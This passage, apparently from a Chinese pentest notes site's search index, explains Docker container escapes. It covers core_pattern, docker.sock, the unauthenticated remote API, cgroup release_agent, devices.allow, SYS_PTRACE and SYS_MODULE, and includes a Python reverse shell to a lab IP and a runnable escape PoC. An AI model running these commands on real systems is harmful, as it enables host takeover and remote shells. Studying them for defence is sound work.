core_pattern","title":"\u6302\u8f7d\u5bbf\u4e3b\u673aprocfs\u9003\u9038"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/#_3","text":"\u627e\u5230\u5f53\u524ddocker\u5728\u5bbf\u4e3b\u673a\u4e0b\u7684\u8def\u5f84 `sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab` \u5b89\u88c5vim\u548cgcc\u5206\u522b\u7528\u4e8e\u7f16\u8f91exp\u548c\u7f16\u8bd1\u9020\u6210\u5d29\u6e83\u7684C\u6587\u4ef6 vim /tmp/.exp.py #!/usr/bin/python3 import os import pty import socket lhost = \"172.16.214.1\" lport = 4444 def main(): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((lhost, lport)) os.dup2(s.fileno(), 0) os.dup2(s.fileno(), 1) os.dup2(s.fileno(), 2) os.putenv(\"HISTFILE\", '/dev/null') pty.spawn(\"/bin/bash\") # os.remove('/tmp/.t.py') s.close() if __name__ == \"__main__\": main() \u7136\u540e\u7ed9python\u6587\u4ef6\u52a0\u4e0a\u53ef\u6267\u884c\u6743\u9650 chmod 777 /tmp/.exp.py \u5411\u6302\u8f7d\u7684core_pattern\u672b\u5c3e\u5199\u5165exp\u8def\u5f84 echo -e \"|/var/lib/docker/overlay2/20c27c85c2556a753bb6e9afc68dc82a3ab4d96e4acc8adf443491d1cf0bd526/diff/tmp/.exp.py /r core\" > /host/proc/sys/kernel/core_pattern \u8fd0\u884c\u4e00\u4e2a\u9020\u6210\u5d29\u6e83\u7684c\u7a0b\u5e8f vim t.c #include<stdio.h> int main(void) { int *a = NULL; *a = 1; return 0; } gcc t.c -o t ./t \u5c31\u4f1a\u6536\u83b7\u5bbf\u4e3b\u673a\u5f39\u56de\u6765\u7684shell","title":"\u5229\u7528"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/#dockersock","text":"Docker Socket \u7528\u4e8e\u5bbf\u4e3b\u673a\u4e0edocker\u5bb9\u5668\u901a\u4fe1\uff08\u67e5\u8be2\u4fe1\u606f\u3001\u4e0b\u53d1\u547d\u4ee4\u7b49\uff09 \u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u6267\u884cdocker\u6307\u4ee4\u65f6\uff0c\u662f\u901a\u8fc7Docker Socket\u4f5c\u4e3a\u4e2d\u95f4\u4eba\u8f6c\u53d1\u7684\u3002 \u5982\u679c\u5bb9\u5668\u91cc\u6302\u8f7d\u4e86\u5bbf\u4e3b\u673a\u7684docker.sock\u6587\u4ef6\uff0c\u90a3\u4e48\u5c31\u76f8\u5f53\u4e8e\u6211\u4eec\u62ff\u5230\u4e86\u5bbf\u4e3b\u673a\u7684docker\u6307\u4ee4\u6267\u884c\u6743\uff0c\u53ef\u4ee5\u5728\u5bbf\u4e3b\u673a\u4e0a\u6267\u884c\u4efb\u610fdocker\u6307\u4ee4\u3002\u53ea\u9700\u6211\u4eec\u76f4\u63a5\u521b\u5efa\u4e00\u4e2a\u7279\u6743\u5bb9\u5668\u5c31\u80fd\u8f7b\u677e\u9003\u9038\u3002 \u73af\u5883\u642d\u5efa docker run -itd --name with_docker_sock -v /var/run/docker.sock:/var/run/docker.sock kpli0rn/ubuntu:18.04 docker exec -it with_docker_sock /bin/bash \u5b89\u88c5docker\u547d\u4ee4\u884c apt-get update apt-get install curl curl -fsSL https://get.docker.com/ | sh \u68c0\u6d4b\uff1a\u67e5\u770b\u6709\u6ca1\u6709\u53ebdocker.sock\u7684\u6587\u4ef6","title":"\u5229\u7528docker.sock\u9020\u6210\u9003\u9038"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/#_4","text":"\u628a\u5bbf\u4e3b\u673a\u6839\u76ee\u5f55\u6302\u8f7d\u5230\u65b0\u5bb9\u5668\u7684/host\u76ee\u5f55\u4e0b\u3002\u5e76\u8fdb\u5165\u65b0\u5bb9\u5668\u7684shell\u91cc docker run -it -v /:/host ubuntu /bin/bash \u5b9a\u65f6\u4efb\u52a1\u5565\u7684\u5f39\u4e2ashell\u56de\u6765\u5c31\u9003\u9038\u4e86","title":"\u5229\u7528"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/#api","text":"docker remote api \u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7http\u8bf7\u6c42\u6267\u884c docker \u547d\u4ee4\u3002 \u5982\u679c\u8fd9\u4e2aapi\u5f00\u653e\u5728\u4e86\u516c\u7f51\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u5229\u7528\u8fd9\u4e2aapi\u64cd\u4f5cdocker\u3002 \u73af\u5883\u642d\u5efa systemctl stop docker //\u5148\u628adocker\u5173\u4e86 dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375 //\u8fd9\u4e2a\u7aef\u53e3\u5e76\u4e0d\u4e00\u5b9a\u662f2375\uff0c\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u5224\u65ad \u51fa\u73b0404\u5219\u8bf4\u660e\u5b58\u5728\u672a\u6388\u6743","title":"\u8fdc\u7a0bAPI\u672a\u6388\u6743\u9020\u6210\u9003\u9038"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/#_5","text":"\u5217\u51fa\u5bb9\u5668\u4fe1\u606f curl http://<target>:2375/containers/json \u67e5\u770b\u5bb9\u5668 docker -H tcp://<target>:2375 ps -a \u65b0\u8fd0\u884c\u4e00\u4e2a\u5bb9\u5668\uff0c\u6302\u8f7d\u70b9\u8bbe\u7f6e\u4e3a\u670d\u52a1\u5668\u7684\u6839\u76ee\u5f55\u6302\u8f7d\u81f3/mnt\u76ee\u5f55\u4e0b\u3002 docker -H tcp://10.1.1.211:2375 run -it -v /:/mnt nginx:latest /bin/bash","title":"\u5229\u7528"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/#_6","text":"\u7528exp\u786c\u9020\u5c31\u5b8c\u4e8b\u4e86","title":"\u5185\u6838\u6f0f\u6d1e"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/#lxcfs","text":"lxcfs \u662flinux\u4e0b\u4e00\u4e2a\u7528\u4e8e\u865a\u62df\u5316\u5bb9\u5668\u7684\u5de5\u5177\u3002 \u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5bb9\u5668\u4f1a\u6302\u5728\u5bbf\u4e3b\u673a\u4e0a\u7684/proc\u76ee\u5f55,\u5176\u5305\u542b\u5982\uff1ameminfo, cpuinfo\uff0cstat\uff0c uptime\u7b49\u8d44\u6e90\u4fe1\u606f\uff0c\u53ef\u80fd\u4f1a\u5e26\u6765\u4e00\u4e9b\u4e0d\u5fc5\u8981\u7684\u9519\u8bef\u6216\u8005\u4e0d\u4fbf\u3002 \u800clxcfs\u4e3a\u5bb9\u5668\u63d0\u4f9b\u4e86\u4e0b\u5217procfs\u6587\u4ef6,\u6bd4\u5982\u628a\u5bbf\u4e3b\u673a\u7684 /var/lib/lxcfs/proc/memoinfo \u6587\u4ef6\u6302\u8f7d\u5230Docker\u5bb9\u5668\u7684/proc/meminfo\u4f4d\u7f6e\u540e\uff0c\u5bb9\u5668\u8bfb\u53d6\u76f8\u5e94\u5185\u5bb9\u65f6\u4f1a\u901a\u8fc7lxcfs\u83b7\u53d6\u6b63\u786e\u7684\u7ea6\u675f\u8bbe\u5b9a\uff0c\u5b9e\u73b0\u5bb9\u5668\u5185/proc\u4e0e\u7269\u7406\u673a\u9694\u79bb\u3002 /proc/cpuinfo /proc/diskstats /proc/meminfo /proc/stat /proc/swaps /proc/uptime \u73af\u5883\u642d\u5efa\uff1a apt install lxcfs \u6216\u8005 git clone https://github.com/lxc/lxcfs.git lxcfs /var/lib/lxcfs docker run -it -v /var/lib/lxcfs/:/test/:rw kpli0rn/ubuntu:18.04 /bin/bash \u6b64\u65f6\u5bb9\u5668\u91cc\u7684/test\u76ee\u5f55\u4f1a\u6709\u8fd9\u4e9b\u6587\u4ef6\uff08\u6302\u8f7d\u81ea\u5bbf\u4e3b\u673a\uff09 \u68c0\u6d4b\uff1a\u662f\u5426\u542f\u7528\u4e86lxcfs cat /proc/1/mountinfo | grep lxcfs","title":"\u5229\u7528lxcfs"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/#_7","text":"\u65e0\u5948\u73af\u5883\u642d\u4e0d\u4e0a\uff0c\u5c31\u7b80\u5355\u8bf4\u8bf4\u548b\u5229\u7528\u7684\u5427 https://www.ai2news.com/blog/1441724/ \u9996\u5148\u56e0\u4e3alxcfs/cgroup\u88ab\u6302\u8f7d\u8fdb\u4e86\u5bb9\u5668\uff0c\u5e76\u4e14\u5bb9\u5668\u5bf9\u6302\u5728\u8fdb\u6765\u7684lxcfs/cgroup\u6709\u8bfb\u5199\u6743\uff0c\u90a3\u4e48\u53ef\u4ee5\u5148\u4fee\u6539\u5f53\u524d\u5df2\u63a7\u5236\u5bb9\u5668\u5bf9\u5e94\u7684devices.allow\u4e3aa\u6765\u8bbe\u7f6e\u5bb9\u5668\u5141\u8bb8\u8bbf\u95ee\u6240\u6709\u7c7b\u578b\u8bbe\u5907 echo a > /test/lxcfs/cgroup/devices/docker/some_id/devices.allow \u53c8\u56e0\u4e3a/etc/host\u662f\u9ed8\u8ba4\u6302\u8f7d\u8fdb\u5bb9\u5668\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u547d\u4ee4\u62ff\u5230\u5bbf\u4e3b\u673a\u8bbe\u5907\u5bf9\u5e94\u7684ID\u53f7 cat /proc/self/mountinfo |grep etc \u7136\u540e\u4f7f\u7528\u5982\u4e0b\u6307\u4ee4\uff0c\u914d\u5408\u521a\u521a\u62ff\u5230\u7684\u5bbf\u4e3b\u673a\u5bf9\u5e94\u7684id\u53f7\uff0c\u5c31\u80fd\u8bfb\u5199\u5bbf\u4e3b\u673a\u6587\u4ef6\u4e86 mknod test b 252 1 //\u521b\u5efa\u57fa\u4e8e\u5bbf\u4e3b\u673a\u7684\u5757\u8bbe\u5907 debugfs -w test //\u5bf9\u521a\u521a\u521b\u5efa\u7684\u5757\u8bbe\u5907\u8fdb\u884c\u8c03\u8bd5\uff0c\u4e5f\u5c31\u662f\u80fd\u8fdb\u5165\u5bbf\u4e3b\u673a\u6587\u4ef6\u7cfb\u7edf\u4e86 \u8fd9\u4e2a\u5229\u7528\u65b9\u5f0f \u5e76\u4e0d\u53ea\u5bf9lxcfs\u6709\u6548\uff0c\u5982\u679c\u6211\u4eec\u80fd\u8bfb\u5199cgroup\u6587\u4ef6\uff0c\u7406\u8bba\u4e0a\u90fd\u80fd\u8fd9\u4e48\u9003\u9038","title":"\u5229\u7528"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/#privileged","text":"\u73af\u5883\u642d\u5efa docker run --rm --privileged=true -it kpli0rn/ubuntu:18.04 \u7136\u540e\u6211\u4eec\u5c31\u8fdb\u5165\u4e86\u7279\u6743\u5bb9\u5668\u5185\u90e8\u3002 \u5b83\u6709\u5982\u4e0b\u7279\u6743 \u7981\u7528Seccomp\u548cAppArmor\u7b49\u5b89\u5168\u673a\u5236 Capabilities\u52a0\u6ee1 \u90a3\u4e48\u600e\u4e48\u67e5\u770b\u5f53\u524d\u5bb9\u5668\u662f\u5426\u662f\u7279\u6743\u5bb9\u5668\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u67e5\u770b\u5f53\u524d\u5bb9\u5668init\u8fdb\u7a0b\uff08/proc/1\uff09\u7684capabilities\u5c5e\u6027\u4e2d\u662f\u5426\u542f\u7528\u4e86 capability sets \u6765\u5224\u65ad\u3002 capability sets \u9ed8\u8ba4\u662f\u4e0d\u542f\u52a8\u7684\uff0c\u800c\u7279\u6743\u5bb9\u5668\u7684init\u8fdb\u7a0b\u4f1a\u542f\u7528\u3002 \u6211\u4eec\u53ef\u4ee5\u7528\u5982\u4e0b\u6307\u4ee4\u6765\u68c0\u6d4bcapability sets \u662f\u5426\u5728init\u542f\u7528\u4ece\u800c\u5224\u65ad\u662f\u5426\u662f\u9ad8\u6743\u9650\u5bb9\u5668 cat /proc/1/status | grep Cap \u4e0a\u56fe\u4fbf\u662f\u7279\u6743\u5bb9\u5668\u6307\u4ee4\u6267\u884c\u7684\u7ed3\u679c\u3002","title":"privileged\u53c2\u6570\u7279\u6743\u5bb9\u5668\u9003\u9038"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/#_8","text":"\u901a\u8fc7fdisk\u6307\u4ee4\u67e5\u770b\u6302\u8f7d\u78c1\u76d8\u7684\u60c5\u51b5 \u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u53ef\u4ee5\u5bbf\u4e3b\u673a\u7684\u78c1\u76d8\u5728docker\u5185\u90e8\u663e\u793a\u4e3a\u6587\u4ef6 /dev/vda1. \u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u6302\u8f7d\u5230\u6211\u4eecdocker\u5185\u90e8\u7684\u78c1\u76d8\u4e2d\u53bb \u7136\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u5411\u6302\u8f7d\u8fdb\u6765\u7684\u5bbf\u4e3b\u78c1\u76d8\u4e2d\u5199\u5165\u5b9a\u65f6\u4efb\u52a1\u6765\u53cd\u5f39shell\u4e86","title":"\u5229\u7528:\u76ee\u5f55\u6302\u8f7d"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/#notify_on_release","text":"Cgroup \u9700\u8981\u5148\u4e86\u89e3\u4e00\u4e0blinux\u4e0b\u7684cgroup\u673a\u5236 cgroup\u673a\u5236\u662f2.6\u5185\u6838\u7531google\u516c\u53f8\u4e3b\u5bfc\u5f15\u5165\u7684\uff0c\u7528\u4e8e\u5b9e\u73b0linux\u5185\u6838\u8d44\u6e90\u865a\u62df\u5316\u3002docker\u6240\u7528\u5230\u7684\u8d44\u6e90\u9694\u79bb\u6280\u672f\u4fbf\u662fcgroup\u3002 cgroup\u6709\u56db\u4e2a\u6bd4\u8f83\u91cd\u8981\u7684\u6982\u5ff5\uff1a \u5b50\u7cfb\u7edf\uff1a\u4e00\u4e2a\u5b50\u7cfb\u7edf\u5c31\u662f\u4e00\u4e2a\u8d44\u6e90\u7684\u63a7\u5236\u5668\uff0c\u6bd4\u5982CPU\u5b50\u7cfb\u7edf\u5c31\u662f\u63a7\u5236CPU\u7684\u4e00\u4e2a\u63a7\u5236\u5668\u3002 \u5c42\u7ea7\uff1a\u4e00\u4e2a\u5b50\u7cfb\u7edf\u5fc5\u987b\u8981\u9644\u52a0\uff08attach\uff09\u5230\u4e00\u4e2a\u5c42\u7ea7\u4e0a\u624d\u80fd\u8d77\u4f5c\u7528\u3002\u4f7f\u7528 mkdir -p /cgroup/name && mount -t cgroup -o subsystems name /cgroup/name \u547d\u4ee4\u521b\u5efa\u4e00\u4e2a\u5c42\u7ea7\uff0c\u5e76\u628a\u8be5\u5c42\u7ea7\u6302\u8f7d\u5230\u76ee\u5f55\u3002 \u63a7\u5236\u7ec4\u7fa4\uff1a\u8fdb\u7a0b\u53ef\u4ee5\u52a0\u5165\u5230\u67d0\u4e2a\u63a7\u5236\u7ec4\u7fa4\uff0c\u4e5f\u53ef\u4ee5\u8fc1\u79fb\u5230\u53e6\u4e00\u4e2a\u63a7\u5236\u7ec4\u7fa4\u3002\u63a7\u5236\u7ec4\u6307\u660e\u4e86\u5185\u90e8\u8d44\u6e90\u7684\u914d\u989d\u9650\u5236\uff0c\u5373\u4e0a\u9650\u3002 \u4efb\u52a1\uff1a\u4e00\u4e2a\u4efb\u52a1\u5bf9\u5e94\u7740\u7cfb\u7edf\u7684\u4e00\u4e2a\u8fdb\u7a0b\u3002\u63a7\u5236\u7ec4\u7fa4\u6240\u5bf9\u5e94\u7684\u76ee\u5f55\u4e2d\u6709\u4e00\u4e2a tasks \u6587\u4ef6\uff0c\u5c06\u8fdb\u7a0bID\u5199\u8fdb\u8be5\u6587\u4ef6\uff0c\u8be5\u8fdb\u7a0b\u5c31\u4f1a\u53d7\u5230\u8be5\u63a7\u5236\u7ec4\u7fa4\u7684\u9650\u5236\u3002 Cgroup\u6709\u51e0\u4e2a\u91cd\u8981\u7684\u6587\u4ef6 /sys/fs/cgroup \u6709\u6240\u6709\u5b50\u7cfb\u7edf\u7684\u4fe1\u606f /sys/fs/cgroup/<subsystem_name>/cgroup.procs \u8bb0\u5f55\u8be5\u5b50\u7cfb\u7edf\u4efb\u52a1\u8fdb\u7a0bPID /sys/fs/cgroup/<subsystem_name>/tasks \u7ea6\u7b49\u4e8ecgroup.procs /sys/fs/cgroup/<subsystem_name>/notify_on_release \u53ea\u67090\u62161\u4e24\u4e2a\u503c \u5f53\u4e3a1\u65f6\uff0ccgroup\u4e0b\u6240\u6709\u4efb\u52a1\u7ed3\u675f\u540e\uff0c\u5185\u6838\u5c31\u4f1a\u4ee5root\u6743\u9650\u8fd0\u884c/sys/fs/cgroup/<subsystem_name>/release_agent \u6587\u4ef6\u4e2d\u5bf9\u5e94\u8def\u5f84\u7684\u6587\u4ef6 notify_on_release\u673a\u5236\u9003\u9038 \u901a\u8fc7\u4e0a\u9762\u5bf9Cgroup\u7684\u53d9\u8ff0\uff0c\u53ef\u4ee5\u53d1\u73b0notify_on_release \u8fd9\u4e2a\u6587\u4ef6\u5f88\u7279\u6b8a\uff0c\u5f53\u5b83\u4e3a1\u65f6\uff0c\u5728cgroup\u7ed3\u675f\u6240\u6709\u4efb\u52a1\u540e\u5185\u6838\u4f1a\u4ee5root\u6743\u9650\u8fd0\u884c release_agent\u6587\u4ef6\u4e2d \u7684\u5bf9\u5e94\u8def\u5f84\u7684\u6587\u4ef6\u3002 \u6240\u4ee5\u5982\u679c\u6211\u4eec\u5bf9cgroup\u53ef\u7f16\u8f91\uff0c\u4e14\u83b7\u5f97\u4e86\u5f53\u524d\u5bb9\u5668\u5728\u5bbf\u4e3b\u673a\u4e2d\u7684\u7edd\u5bf9\u8def\u5f84\uff0c\u4e14\u62e5\u6709cap_sys_admin\u6743\u9650\u90a3\u4e48\u5c31\u53ef\u4ee5\u5b8c\u6210\u9003\u9038\u3002 \u5177\u4f53\u505a\u6cd5\u4e3a\uff0c\u65b0\u5efa\u4e00\u4e2a\u5b50cgroup\uff0c\u5c06\u5176notify_on_release \u8bbe\u4e3a1\uff0c release_agent \u6587\u4ef6\u4e2d\u7684\u8def\u5f84\u8bbe\u4e3a\u5bb9\u5668\u4e2d\u7684\u6076\u610f\u811a\u672c\u6587\u4ef6\u5728\u5bbf\u4e3b\u673a\u7684\u7edd\u5bf9\u8def\u5f84\u3002\u7136\u540e\u6e05\u7a7acgroup.procs\u6216tasks \u6587\u4ef6\uff0c\u4f7f\u6076\u610f\u811a\u672c\u6587\u4ef6\u88ab\u5bbf\u4e3b\u673a\u4ee5root\u6743\u9650\u8fd0\u884c\u3002 \u73af\u5883\u642d\u5efa\uff1a --security-opt apparmor=unconfined \u662f\u5173\u95ed\u5185\u6838\u5b89\u5168\u6a21\u5757\u53c2\u6570\uff0c\u8fd9\u4e2a\u6a21\u5757\u5982\u679c\u6253\u5f00\u6709\u53ef\u80fd\u4f1a\u5bfc\u81f4\u9003\u9038\u5931\u8d25 docker run -it --cap-add='SYS_ADMIN' --security-opt apparmor=unconfined kpli0rn/ubuntu:18.04 bash \u68c0\u6d4b\uff1a cat /proc/1/status | grep Cap \u521b\u5efa\u5b50cgroup\u5e76\u4fee\u6539notify_on_release mkdir /tmp/aa && mount -t cgroup -o rdma cgroup /tmp/aa &&echo 1 > /tmp/aa/notify_on_release \u83b7\u53d6\u5728\u5bbf\u4e3b\u673a\u7684\u7edd\u5bf9\u8def\u5f84 sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab \u7136\u540e\u5199\u5165\u5b50cgroup\u7684release_agent\u6587\u4ef6\uff0c\u6307\u5411\u4e00\u4e2a\u6076\u610f\u7684\u811a\u672c\u6587\u4ef6\uff0c\u5e76\u7ed9\u4e88\u53ef\u6267\u884c\u6743 echo '#!/bin/sh' > /tmp/exp echo \"mkdir /hack_in\" > /tmp/exp d=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab` echo $d/tmp/exp > /tmp/aa/release_agent chmod 777 /tmp/exp \u7136\u540e\u6e05\u7a7a\u5b50cgroup\u76ee\u5f55\u4e0b\u7684cgroup.procs\u6216tasks\u6587\u4ef6 sh -c \"echo \\$\\$ > /tmp/aa/cgroup.procs\" \u68c0\u6d4bPOC #!/bin/bash set -uex mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x echo 1 > /tmp/cgrp/x/notify_on_release host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab` echo \"$host_path/cmd\" > /tmp/cgrp/release_agent echo '#!/bin/sh' > /cmd echo \"ps aux > $host_path/output\" >> /cmd chmod a+x /cmd sh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\" sleep 2 cat \"/output\"","title":"\u5229\u7528:notify_on_release"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/#devicesallow","text":"\u4e5f\u5c31\u662f\u521a\u521a\u63d0\u5230\u4e86lxcfs\u91cc\u7528\u5230\u7684\u65b9\u6cd5\u3002\u53ea\u4e0d\u8fc7\u6211\u4eec\u9700\u8981\u624b\u52a8\u628acgroup/devices\u6302\u8f7d\u8fdb\u6765 mkdir /tmp/dev mount -t cgroup -o devices devices /tmp/dev/ \u7136\u540e\u4fbf\u662f\u4fee\u6539devices.allow \u7136\u540e\u4fbf\u662f\u627e\u5bbf\u4e3b\u673anode\u53f7\uff0c\u5e76debugfs\u8c03\u8bd5","title":"\u5229\u7528\uff1a\u91cd\u5199devices.allow"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/#sys_ptrace","text":"SYS_PTRACE\u662f\u542f\u52a8docker\u5bb9\u5668\u65f6\u9644\u52a0\u7684\u4e00\u4e2a\u6743\u9650\u53c2\u6570\uff0c\u5b83\u8d77\u5230\u4e00\u4e2a\u8c03\u8bd5\u5668\u7684\u4f5c\u7528\u3002\u4ee5\u9ad8\u6743\u9650\u53c2\u6570\u542f\u52a8\u65f6\u9ed8\u8ba4\u5e26\u6709\u8be5\u6743\u9650\u3002 docker --cap-add=SYS_PTRACE \u6216 Kubernetes PODS \u8bbe\u7f6e securityContext.capabilities \u4e3a SYS_PTRACE \u914d\u7f6e\u7b49\u628a SYS_PTRACE capabilities\u6743\u9650\u8d4b\u4e88\u5bb9\u5668\u7684\u60c5\u51b5\uff0c\u90fd\u53ef\u80fd\u5bfc\u81f4\u5bb9\u5668\u9003\u9038\u3002 ........... \u8fd9\u4e2a\u573a\u666f\u5f88\u5e38\u89c1\uff0c\u56e0\u4e3a\u65e0\u8bba\u662f\u4e0d\u662f\u7ebf\u4e0a\u73af\u5883\uff0c\u4e1a\u52a1\u8fdb\u884c\u707e\u96be\u91cd\u8bd5\u548c\u7a0b\u5e8f\u8c03\u8bd5\u90fd\u662f\u6ca1\u529e\u6cd5\u907f\u514d\u7684\uff0c\u6240\u4ee5\u5bb9\u5668\u7ecf\u5e38\u88ab\u8bbe\u7f6e ptrace \u6743\u9650\u3002 \u2014\u2014\u2014\u2014\u817e\u8baf\u84dd\u519b \u56e0\u4e3a\u6709\u8c03\u8bd5\u5668\u6743\u9650\uff0c\u90a3\u4e48\u5c31\u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u5bf9\u5176\u4ed6\u8fdb\u7a0b\u8fdb\u884c\u8c03\u8bd5\uff0c\u540c\u65f6\u4e5f\u5c31\u610f\u5473\u7740\u53ef\u4ee5\u5bf9\u5176\u4ed6\u8fdb\u7a0b\u8fdb\u884c\u8fdb\u7a0b\u6ce8\u5165\u3002 \u4f46\u662f\u7531\u4e8enamespace\u7684\u5b58\u5728\u9020\u6210\u4e86\u8fdb\u7a0b\u9694\u79bb\uff0c\u65e0\u6cd5\u76f4\u63a5\u8bbf\u95ee\u5230\u5bbf\u4e3b\u673a\u8fdb\u7a0bpid\uff0c\u56e0\u6b64\u5728\u5bb9\u5668\u542f\u52a8\u65f6\u9700\u8981\u9644\u52a0--pid=host\u6253\u7834\u8fdb\u7a0b\u9694\u79bb \u540c\u65f6apparmor\u4e5f\u53ef\u80fd\u4f1a\u5bf9\u6b64\u9020\u6210\u4e00\u5b9a\u5f71\u54cd\uff0c\u5b9e\u9a8c\u65f6\u53ef\u4ee5\u5c06\u5176\u5173\u95ed \u73af\u5883\u642d\u5efa docker run --pid=host --cap-add=SYS_PTRACE --rm -it kpli0rn/ubuntu:18.04 \u68c0\u6d4b \u7136\u540e\u7528ps\u6307\u4ee4\u627e\u5230\u5bbf\u4e3b\u673a\u8fdb\u7a0bPID ps auxx | grep root \u7136\u540e\u4f7f\u7528exp\u8fdb\u884c\u8fdb\u7a0b\u6ce8\u5165\uff1a https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c \u9700\u8981\u81ea\u5df1\u7f16\u8bd1\u5e76\u4e14\u4fee\u6539\u6b64\u5904\u7684payload\u3002\u6539\u6210msf\u6216\u8005cs\u7684\u90fd\u884c","title":"SYS_PTRACE \u6743\u9650\u9003\u9038"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/#cap_sys_module","text":"\u8fd9\u4e2a\u7279\u6743\u8868\u793a\u80fd\u591f\u52a0\u8f7d\u5185\u6838\u6a21\u5757\uff0c\u90a3\u4e48\u6211\u4eec\u53ea\u9700\u8981\u6784\u9020\u4e00\u4e2a\u6267\u884c\u6076\u610f\u547d\u4ee4\u7684\u5185\u6838\u6a21\u5757\u7ed9\u5bb9\u5668\u52a0\u8f7d\u5c31\u884c\u4e86\u3002\u539f\u7406\u5c31\u662f\u8fd9\u6837\u3002 \u73af\u5883\u642d\u5efa docker run --cap-add=SYS_MODULE --rm -it kpli0rn/ubuntu:18.04 \u5177\u4f53\u590d\u73b0\uff1a https://blog.jus4fun.xyz/article/109/","title":"cap_sys_module 